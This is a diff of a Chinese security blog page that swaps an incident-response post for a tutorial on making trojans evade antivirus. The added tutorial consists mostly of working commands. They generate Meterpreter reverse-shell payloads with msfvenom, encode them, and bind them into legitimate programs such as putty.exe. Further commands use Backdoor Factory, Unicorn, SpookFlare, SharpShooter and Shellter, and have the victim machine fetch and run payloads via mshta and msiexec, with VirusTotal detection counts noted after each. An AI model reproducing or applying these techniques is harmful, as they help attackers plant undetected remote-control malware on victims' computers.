@@ -4,10 +4,26 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="黑客攻击应急响应, Broken-year">
-    <meta name="description" content="黑客攻击应急响应应急响应web入侵：挂马，网页篡改（菠菜，黑帽seo），植入webshell，黑页，暗链等
-主机入侵：病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等
-网络攻击：DDOS&amp;#x2F;CC">
+    <meta name="keywords" content="kill-free-trojan, Broken-year">
+    <meta name="description" content="免杀技术以及木马处理
+如果需要深入了解
+需要学习：破解、二进制、逆向工程
+
+杀毒软件原理：扫描技术：
+
+扫描压缩包，对压缩包内容进行分析检查
+
+程序篡改防护：
+
+避免感染文件
+
+修复技术：
+
+对受损文件进行还原
+
+急救盘杀毒：
+
+利用空白的">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +35,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>黑客攻击应急响应 | Broken-year</title>
+    <title>kill-free-trojan | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +327,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">黑客攻击应急响应</h1>
+                    <h1 class="description center-align post-title">kill-free-trojan</h1>
                 </div>
             </div>
         </div>
@@ -436,8 +452,20 @@
                                 <span class="chip bg-color">网络安全</span>
                             </a>
                         
-                            <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                                <span class="chip bg-color">应急响应</span>
+                            <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                <span class="chip bg-color">工具使用</span>
+                            </a>
+                        
+                            <a href="/tags/msf/">
+                                <span class="chip bg-color">msf</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%85%8D%E6%9D%80/">
+                                <span class="chip bg-color">免杀</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                <span class="chip bg-color">木马</span>
                             </a>
                         
                     </div>
@@ -482,232 +510,280 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="黑客攻击应急响应"><a href="#黑客攻击应急响应" class="headerlink" title="黑客攻击应急响应"></a>黑客攻击应急响应</h1><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><strong>web入侵：</strong><br>挂马，网页篡改（菠菜，黑帽seo），植入webshell，黑页，暗链等</p>
-<p><strong>主机入侵：</strong><br>病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等</p>
-<p><strong>网络攻击：</strong><br>DDOS&#x2F;CC攻击，ARP攻击，DNS&#x2F;HTTP劫持</p>
-<p><strong>路由器&#x2F;交换机攻击：</strong><br>内网病毒，配置错误，机器本身的漏洞等</p>
-<h2 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h2><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p>病毒，木马，蠕虫事件；<br>web服务器或者第三方服务入侵事件；<br>系统入侵事件；<br>网络攻击。</p>
-<h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><pre><code>eventvwr.msc 打开日志
-</code></pre>
-<p>位置：</p>
+                <h1 id="免杀技术以及木马处理"><a href="#免杀技术以及木马处理" class="headerlink" title="免杀技术以及木马处理"></a>免杀技术以及木马处理</h1><blockquote>
+<p>如果需要深入了解</p>
+<p>需要学习：破解、二进制、逆向工程</p>
+</blockquote>
+<h2 id="杀毒软件原理："><a href="#杀毒软件原理：" class="headerlink" title="杀毒软件原理："></a>杀毒软件原理：</h2><p><strong>扫描技术</strong>：</p>
 <blockquote>
-<p>C:\Windows\System32\winevt\logs</p>
-<p>(旧位置)C:\Windows\System32\config</p>
-<p>C:\windows\System32\wdi\LogFiles</p>
-<p>C:\Windows\System32\wdi\{86432a0b-3c7d-4ddf-a89c-172faa90485d} 存放id</p>
+<p>扫描压缩包，对压缩包内容进行分析检查</p>
 </blockquote>
-<p><strong>在主机上完成的一些操作</strong>都会被当做<strong>事件</strong>存在日志里。</p>
-<p>主要看<strong>事件ID</strong>来进行排查。</p>
-<p>可以<strong>筛选当前日志</strong>：</p>
-<p><img src="/2022/03/21/emergency-response/image-20220111172648892.png" alt="image-20220111172648892"></p>
-<p>需要了解一些相关事件ID。</p>
-<p>事件ID：<code>1102</code>事件为删除日志。</p>
-<p>关于日志，有些黑客会删除日志、更改日志等。</p>
-<h3 id="检查账户"><a href="#检查账户" class="headerlink" title="检查账户"></a>检查账户</h3><pre><code>net user
+<p><strong>程序篡改防护</strong>：</p>
+<blockquote>
+<p>避免感染文件</p>
+</blockquote>
+<p><strong>修复技术</strong>：</p>
+<blockquote>
+<p>对受损文件进行还原</p>
+</blockquote>
+<p><strong>急救盘杀毒</strong>：</p>
+<blockquote>
+<p>利用空白的u盘制作进行杀毒</p>
+</blockquote>
+<p><strong>智能扫描</strong>：</p>
+<blockquote>
+<p>扫描常用磁盘和系统关键位置</p>
+</blockquote>
+<p><strong>全盘扫描</strong>：</p>
+<blockquote>
+<p>所有地方都扫描</p>
+</blockquote>
+<p><strong>勒索软件防护</strong>：</p>
+<blockquote>
+<p>保护电脑文件不被加密</p>
+</blockquote>
+<p><strong>开机扫描</strong>：</p>
+<blockquote>
+<p>扫描坑不需要的程序</p>
+</blockquote>
+<p><strong>监控技术</strong>：</p>
+<p>内存监控：</p>
+<blockquote>
+<p>监控内存，进程，网络数据</p>
+</blockquote>
+<p>文件监控：</p>
+<blockquote>
+<p>发现文件存在病毒或者被感染报警</p>
+</blockquote>
+<p>邮件监控：</p>
+<blockquote>
+<p>电子邮件病毒拦截</p>
+</blockquote>
+<p><strong>网页防护</strong>：</p>
+<blockquote>
+<p>阻止网络攻击和不安全的下载</p>
+</blockquote>
+<p><strong>行为防护</strong>：</p>
+<blockquote>
+<p>提醒用户应用程序可疑的行为</p>
+</blockquote>
+<h2 id="安装wine32"><a href="#安装wine32" class="headerlink" title="安装wine32"></a>安装wine32</h2><pre><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32 
 </code></pre>
-<p>并且去：</p>
-<p><code>计算机管理 \ 本地用户和组 \ 用户</code> 里</p>
-<p>再次查看检查</p>
-<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><pre><code>regedit
+<p>linux支持exe程序</p>
+<h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><pre><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py 
+
+python2 get-pip.py 
+
+apt-get install python3-pip 
+
+pip install --upgrade pip -i https://pypi.douban.com/simple 
+</code></pre>
+<p>python应用商店</p>
+<h2 id="生成一个普通木马"><a href="#生成一个普通木马" class="headerlink" title="生成一个普通木马"></a>生成一个普通木马</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=[端口] -f exe -o shell.exe
+# -p windows/meterpreter/reverse_tcp 利用windows/meterpreter/reverse_tcp 生成木马程序
+# lhost=[ip] lport=[端口] 连接本地ip和端口
+# -o shell.exe 生成名为shell.exe的木马程序
+</code></pre>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost=192.168.3.134
+show options
+exploit
+
+background
+sessions
+</code></pre>
+<p><a target="_blank" rel="noopener" href="http://virustotal.com/">http://virustotal.com</a></p>
+<blockquote>
+<p>56&#x2F;71</p>
+</blockquote>
+<h2 id="msf自带免杀"><a href="#msf自带免杀" class="headerlink" title="msf自带免杀"></a>msf自带免杀</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15 -f exe -o shell.exe
+
+# x86/shikata_ga_nai 用自带免杀把软件进行加密
+# 屏蔽\x00 i加密15次
+# -f exe 加密同时不能破坏exe的结构
 </code></pre>
 <blockquote>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</p>
-<p>HKEY_LOCAL_MACHINE\SAM\SAM</p>
+<p>55&#x2F;71</p>
 </blockquote>
-<p><img src="/2022/03/21/emergency-response/image-20220112113529639.png" alt="image-20220112113529639"></p>
+<h2 id="msf捆绑免杀"><a href="#msf捆绑免杀" class="headerlink" title="msf捆绑免杀"></a>msf捆绑免杀</h2><p>比如：一个正经软件+捆绑木马</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -x putty.exe -f exe -o shell.exe
+
+# -x putty.exe 把木马程序捆绑在putty.exe上
+# -f exe 加密同时不能破坏exe的结构
+</code></pre>
 <blockquote>
-<p>[s表示id，1表示标准，1-5-18是system权限，1-5-18、1-5-19、1-5-20一般是默认的，5是标识符的权限，长的一般是用户自己设置的别的用户]</p>
+<p>44&#x2F;71</p>
 </blockquote>
-<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="临时目录排查"><a href="#临时目录排查" class="headerlink" title="临时目录排查"></a>临时目录排查</h4><blockquote>
-<p>tmp&#x2F;temp</p>
-<p>C:\Users\Administrator\Local Settings\Temp</p>
-<p>C:\Documents and Settings\Local Settings\Temp</p>
-<p>C:\Users\Administrator\Desktop</p>
-<p>C:\Users\Administrator\Local Settings\Temporary Internet Files</p>
-</blockquote>
-<h4 id="浏览器相关文件"><a href="#浏览器相关文件" class="headerlink" title="浏览器相关文件"></a>浏览器相关文件</h4><blockquote>
-<p>C:\Users\Administrators\Cookies</p>
-<p>C:\Users\Documents and Settings\username</p>
-<p>C:\Users\Administrator\Local Settings\History</p>
-</blockquote>
-<p>也可以到控制面板-&gt;Internet选项-&gt;浏览历史记录-&gt;设置</p>
-<p><img src="/2022/03/21/emergency-response/image-20220112114704841.png" alt="image-20220112114704841"></p>
-<p><img src="/2022/03/21/emergency-response/image-20220112114716272.png" alt="image-20220112114716272"></p>
-<h4 id="最近打开文件"><a href="#最近打开文件" class="headerlink" title="最近打开文件"></a>最近打开文件</h4><blockquote>
-<p>C:\User\Administrator\Recent</p>
-</blockquote>
-<h4 id="文件修改时间"><a href="#文件修改时间" class="headerlink" title="文件修改时间"></a>文件修改时间</h4><h4 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h4><blockquote>
-<p>C:\Windows\System32\drivers\etc</p>
-</blockquote>
-<h3 id="网络行为排查"><a href="#网络行为排查" class="headerlink" title="网络行为排查"></a>网络行为排查</h3><p><a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a></p>
-<p><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
-<p><a target="_blank" rel="noopener" href="https://beian.cndns.com/">https://beian.cndns.com/</a></p>
-<p>善用google baidu</p>
-<h4 id="网络连接排查"><a href="#网络连接排查" class="headerlink" title="网络连接排查"></a>网络连接排查</h4><pre><code>netstat -ano
+<h2 id="msf自带免杀-捆绑"><a href="#msf自带免杀-捆绑" class="headerlink" title="msf自带免杀+捆绑"></a>msf自带免杀+捆绑</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o shell.exe
+
+# 合并前两个操作
 </code></pre>
-<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>wireshark&#x2F;burpsuite&#x2F;charles</p>
-<p>xxx.3322.org</p>
-<h4 id="漏洞与补丁信息"><a href="#漏洞与补丁信息" class="headerlink" title="漏洞与补丁信息"></a>漏洞与补丁信息</h4><pre><code>systeminfo   \\打了哪些补丁
-</code></pre>
-<h3 id="可疑进程分析"><a href="#可疑进程分析" class="headerlink" title="可疑进程分析"></a>可疑进程分析</h3><h4 id="进程名字异常-x2F-伪装"><a href="#进程名字异常-x2F-伪装" class="headerlink" title="进程名字异常&#x2F;伪装"></a>进程名字异常&#x2F;伪装</h4><blockquote>
-<p>hsdLj3.tmp 遇到可疑进程可以打开文件具体位置看看到底在哪</p>
-</blockquote>
-<h4 id="进程信息排查"><a href="#进程信息排查" class="headerlink" title="进程信息排查"></a>进程信息排查</h4><blockquote>
-<p>pchunter64位  好使</p>
-</blockquote>
-<h3 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h3><p>pchunter</p>
-<p>msconfig查看启动项以及服务</p>
-<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>看看有没有奇怪的东西</p>
 <blockquote>
-<p>C:\windows\System32\Tasks</p>
+<p>45&#x2F;70</p>
 </blockquote>
-<h4 id="注册表的自动启动："><a href="#注册表的自动启动：" class="headerlink" title="注册表的自动启动："></a>注册表的自动启动：</h4><blockquote>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run【可能有】</p>
-<p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Run【可能有加run的文件】</p>
-<p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
-<p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
+<h2 id="backdoor-factory"><a href="#backdoor-factory" class="headerlink" title="backdoor factory"></a>backdoor factory</h2><blockquote>
+<p>后门工厂 </p>
 </blockquote>
+<pre><code>在github搜索backdoor factory
+下载下来之后进入文件夹
+cd the-backdoor-factory-master/
+chmod 777 ./*
+./install.sh
+pip install -i https://pypi.douban.com/simple pefile/capstone
+# 重新安装缺失组件
+
+对某个正经程序插入木马代码：
+# 查看这个程序是否支持插入代码
+python backdoor.py -f /root/putty.exe -S
+
+# 查找程序里大于600的缝隙
+python backdoor.py -f /root/putty.exe -c -l 600
+
+# 获取文件可用的payload
+python backdoor.py -f /root/putty.exe -s show
+
+# 生成payload
+python backdoor.py -f /root/putty.exe -s reverse_shell_tcp_inline -H 192.168.1.144 -P 4444 -J -o haha.exe
+</code></pre>
+<h2 id="用户自己做的木马"><a href="#用户自己做的木马" class="headerlink" title="用户自己做的木马"></a>用户自己做的木马</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.c
+
+python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shell.c -o haha.exe
+
+# 把木马做成.c的格式
+</code></pre>
+<p>48&#x2F;71</p>
+<h2 id="unicorn独角兽"><a href="#unicorn独角兽" class="headerlink" title="unicorn独角兽"></a>unicorn独角兽</h2><pre><code>cd unicorn-master/
+ls
+chmod 777 ./*
+python unicorn.py --help
+
+python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.144 4444
+
+# 生成2个文件，xxx.rc文件[meterpreter监听代码]和txt文件[powershell的txt文件攻击代码](powershell的txt文件可以考虑变成bat)
+
+msfconsole -r unicorn.rc
+msfconsole -r xxx.rc
+# 使用代码
+</code></pre>
+<p>6&#x2F;59</p>
+<h2 id="spookflare"><a href="#spookflare" class="headerlink" title="spookflare"></a>spookflare</h2><p>GitHub上搜索</p>
+<pre><code>cd  SpookFlare-master/
+ls
+chmod 777 ./*
+# 发现有requirements.txt就要去安装Python的依赖库
+
+安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+
+python  spookflare.py     # 进入
+
+help
+
+list
+use 2
+info    #可以查看需要set的内容【类似于options】
+set PROTO http
+set LHOST 192.168.1.144
+set LPORT 8080
+set ARCH x64
+set SSIZE 61337
+(ps:注意大小写敏感)
+generate    #生成
+</code></pre>
 <blockquote>
-<p><strong>我的电脑</strong>：</p>
-<p>C:\ProgramData\Microsoft\Windows\startmenu【开始菜单】\程序\startapp</p>
+<p>此时生成了三个文件</p>
 </blockquote>
-<h3 id="特定事件痕迹"><a href="#特定事件痕迹" class="headerlink" title="特定事件痕迹"></a>特定事件痕迹</h3><p><strong>挖矿病毒</strong></p>
-<p>社会工程学 钓鱼</p>
-<p>诱导用户点击邮件</p>
-<p>远程代码执行</p>
-<p>第三方软件漏洞</p>
-<p>系统密码弱口令</p>
-<p>web页面挖矿脚本</p>
-<p><strong>特点</strong> cpu gpu 内存很高 还会绑定矿工ip</p>
-<p><strong>勒索病毒</strong></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322113335216.png" alt="image-20220322113335216"></p>
 <blockquote>
-<p>勒索病毒大多数无解 软件被加密</p>
-<p>遇上之后先隔离</p>
+<p>把上面那个cs后缀的文件改名为test.cs</p>
 </blockquote>
-<p>社工，钓鱼软件</p>
-<p>永恒之蓝等漏洞</p>
-<p>弱口令传播</p>
-<p>只能通过重装系统，把相应漏洞补上</p>
-<h2 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h2><blockquote>
-<p>cpu飙升</p>
-<p>服务器卡顿</p>
-<p>异常流量</p>
-<p>异常网络连接</p>
-<p>服务器无法登录</p>
-<p>僵尸网络</p>
-<p>挖矿</p>
-<p>dns服务器报读</p>
-</blockquote>
-<pre><code>ifconfig  查看是否有异常流量
-top -c  cpu和内存使用情况
-lsof -i -PnR 网络通信情况
-ps -aux | grep [pid]  查找进程
-lsof -p [pid] 查看进程打开的文件
-md5sum [文件名] 打开文件的md5值
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319
+
+csc.exe /t:exe /out:test.exe test.cs  //把上面那个cs后缀的文件改名为test.cs
 </code></pre>
-<h3 id="网络行为分析"><a href="#网络行为分析" class="headerlink" title="网络行为分析"></a>网络行为分析</h3><pre><code>who 查看当前用户登录信息
-uname -a 查看系统信息
-netstat -ano 查看所有网络连接
-netstat -utnpl 查看带端口情况的
-arp -a  查看arp表
-iptables -l 查看防火墙规则
-iptables -I INPUT -p tcp --dport 443 -m string --sgring &quot;xxx.com&quot; --algo bm -j DROP  入方向
-iptables -A OUTPUT -d 123.123.123.123 -j DROP 屏蔽出方向到ip的流量
+<h2 id="sharpshooter"><a href="#sharpshooter" class="headerlink" title="sharpshooter"></a>sharpshooter</h2><pre><code>cd   SharpShooter-master/
+ls
+chmod 777 ./*
+# 发现有requirements.txt就要去安装Python的依赖库
+
+# 安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+
+# 生成txt格式木马
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.144 LPORT=4444 -f raw -o shellcode.txt
+
+# 创建ht  a后门
+python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee
+
+# 得到hta格式和html格式
+
+use  multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.144
+set lport 4444
+exploit
+
+被植入电脑cmd：执行
+mshta.exe http://192.168.1.252/foo.hta
+http://192.168.1.252/foo.html
 </code></pre>
-<h3 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h3><pre><code>ps aux
-ps -ef
-top -c
-lsof -p [pid]
-lsof -i
-lsof -c
-</code></pre>
-<h3 id="启动项排查-1"><a href="#启动项排查-1" class="headerlink" title="启动项排查"></a>启动项排查</h3><blockquote>
-<p>&#x2F;etc&#x2F;init.d&#x2F;<br>&#x2F;etc&#x2F;xinetd.d</p>
-</blockquote>
-<p>查看rc.local文件</p>
+<p>类似钓鱼网站执行</p>
 <blockquote>
-<p>&#x2F;etc&#x2F;rc.d&#x2F;rc[0-6].d<br>&#x2F;etc&#x2F;profile.d&#x2F;</p>
+<p>24&#x2F;61</p>
 </blockquote>
-<p><strong>Linux的启动文件：</strong></p>
-<p><strong>init</strong>文件名，<strong>系统启动的第一个脚本</strong></p>
-<p><strong>init.d</strong>目录名，<strong>服务启动脚本</strong></p>
-<p>rcX.d目录名，比如rc1.d，rc2.d…数字代表级别</p>
-<p>etc\rc.d目录名，里面文件s开头一般表示初始化后系统启动的第一个脚本</p>
-<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote>
-<p>&#x2F;etc&#x2F;crontab</p>
-<p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
+<h2 id="msf创建hta程序"><a href="#msf创建hta程序" class="headerlink" title="msf创建hta程序"></a>msf创建hta程序</h2><pre><code>msfconsole
+use exploit/windows/misc/hta_server
+set srvhost [你自己ip]
+set lhost [你自己ip]
+exploit
+
+# 会给你一个网址 http://xxxxxx/xxx.hta
+
+#然后用户可以远程去执行：
+mshta http://xxxxxx/xxx.hta
+</code></pre>
+<blockquote>
+<p>29&#x2F;61</p>
 </blockquote>
-<pre><code>crontab -l 列出
-crontab -r 删除
-crontab -e 编辑
+<h2 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h2><pre><code>apt-get install shellter  # 安装一下，不能在终端操作
+shellter
+A
+PE Target: /root/putty.exe
 </code></pre>
-<h3 id="一些奇怪的目录"><a href="#一些奇怪的目录" class="headerlink" title="一些奇怪的目录"></a>一些奇怪的目录</h3><blockquote>
-<p>&#x2F;var&#x2F;spool</p>
-<p>&#x2F;etc&#x2F;cron.d</p>
-<p>&#x2F;etc&#x2F;cron.daily</p>
-<p>……</p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145051728.png" alt="image-20220322145051728"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145118755.png" alt="image-20220322145118755"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145226624.png" alt="image-20220322145226624"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145536428.png" alt="image-20220322145536428"></p>
+<blockquote>
+<p>Eable Stealth Mode可以no，不然效果会差一点</p>
 </blockquote>
-<h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><pre><code>cat /etc/services 查看服务
-服务名称、使用端口、协议名称/别名、服务干啥用的
+<p>39&#x2F;70</p>
+<p>生成之后在msfconsole里使用:</p>
+<pre><code>handler -H 192.168.1.144 -P 4444 -p windows/meterpreter/reverse_tcp
+
+jobs
+可以看见开启监听
 </code></pre>
-<p><strong>端口</strong></p>
-<p>1-1024 系统保留，大多数情况下只能由root使用</p>
-<p>1024-4999 由客户端程序自由分配</p>
-<p>5000-65535 由服务端程序自由分配</p>
-<h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><pre><code>chkconfig --level 2345 httpd on
-0 = 关机
-1 = 单用户
-2 = 有网络连接的多用户命令行模式
-3 = 无网络连接的多用户命令行模式
-4 = 不可用
-5 = 带图形界面的多用户模式
-6 = 重新启动
-chkconfig --list 查看服务自启动状态
---del  删除
+<h2 id="msi执行的木马——可以隔空执行的"><a href="#msi执行的木马——可以隔空执行的" class="headerlink" title="msi执行的木马——可以隔空执行的"></a>msi执行的木马——可以隔空执行的</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f msi &gt; haha.txt
+
+然后在被控制电脑里：
+msiexec /q /i http://192.168.1.252/haha.txt
 </code></pre>
-<h3 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h3><pre><code>rpm -Va 查看所有软件包的变化情况
-</code></pre>
-<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><blockquote>
-<p>&#x2F;tmp<br>&#x2F;etc&#x2F;init.d<br>&#x2F;usr&#x2F;bin<br>&#x2F;usr&#x2F;sbin<br>&#x2F;root<br>&#x2F;boot<br>&#x2F;bin<br>&#x2F;sbin<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow</p>
+<blockquote>
+<p>35&#x2F;58</p>
 </blockquote>
-<pre><code>ls -alt 按时间排序
-find / *.py -perm 4777 查找所有777权限的py文件
-ls -al /tmp |grep &quot;Feb 10&quot; 寻找特定时间的文件
+<h2 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode-launcher"></a>shellcode-launcher</h2><p>github</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.raw
 </code></pre>
-<h3 id="账号检查"><a href="#账号检查" class="headerlink" title="账号检查"></a>账号检查</h3><pre><code>w  查看某一时刻用户行为
-cat /etc/passwd 用户信息
-cat /etc/shadow 用户密码
-less /etc/passwd 查看有没有新用户
-删除:
-usermod -L [user]
-userdel [user]
-userdel -r [user]
-删除用户之后,/home目录下的用户名文件夹也删了
-last 查看成功的登录 /var/log.wtmp
-lastb 登录失败情况 /var/log/btmp
-lastlog 查看上一次用户登录情况 /var/log/lastlog
-last -x reboot 查看重启记录
-last -x shutdown 查看关机记录
+<p>需要shellcode-launcher执行</p>
+<pre><code>shellcode_launcher.exe -i shell.raw
 </code></pre>
-<h3 id="历史命令检查"><a href="#历史命令检查" class="headerlink" title="历史命令检查"></a>历史命令检查</h3><blockquote>
-<p>.bash_history</p>
+<blockquote>
+<p>24&#x2F;59</p>
 </blockquote>
-<pre><code>history 查看历史命令
-history -c 清空历史命令
-</code></pre>
-<h3 id="其他检查"><a href="#其他检查" class="headerlink" title="其他检查"></a>其他检查</h3><pre><code>echo $PATH 环境变量
-cat /etc/hosts
-处置命令:
-chattr +i [目标文件]
-chmod 000 [目标文件]
-</code></pre>
-<h3 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h3><blockquote>
-<p>&#x2F;var&#x2F;log&#x2F;</p>
-<p>日志配置文件</p>
-<p>&#x2F;etc&#x2F;rsyslog.conf</p>
-</blockquote>
+<p>免杀在实战中很重要，不过最好得学会编程，不然没办法自己研发出自己的木马，用人家的东西效果一般不太友好。</p>
 
                 
             </div>
@@ -734,7 +810,7 @@ chmod 000 [目标文件]
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/03/21/emergency-response/">http://Broken-year.github.io/2022/03/21/emergency-response/</a>
+                    <a href="http://Broken-year.github.io/2022/03/21/kill-free-trojan/">http://Broken-year.github.io/2022/03/21/kill-free-trojan/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -776,8 +852,20 @@ chmod 000 [目标文件]
                                     <span class="chip bg-color">网络安全</span>
                                 </a>
                             
-                                <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                                    <span class="chip bg-color">应急响应</span>
+                                <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                    <span class="chip bg-color">工具使用</span>
+                                </a>
+                            
+                                <a href="/tags/msf/">
+                                    <span class="chip bg-color">msf</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%85%8D%E6%9D%80/">
+                                    <span class="chip bg-color">免杀</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                    <span class="chip bg-color">木马</span>
                                 </a>
                             
                         </div>
@@ -951,9 +1039,10 @@ chmod 000 [目标文件]
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/21/kill-free-trojan/">
                     <div class="card-image">
@@ -971,9 +1060,9 @@ chmod 000 [目标文件]
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -986,6 +1075,7 @@ chmod 000 [目标文件]
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1020,13 +1110,13 @@ chmod 000 [目标文件]
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/21/information-tool/">
+                <a href="/2022/03/21/emergency-response/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="渗透工具使用">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="黑客攻击应急响应">
                         
-                        <span class="card-title">渗透工具使用</span>
+                        <span class="card-title">黑客攻击应急响应</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1058,12 +1148,8 @@ chmod 000 [目标文件]
                         <span class="chip bg-color">网络安全</span>
                     </a>
                     
-                    <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
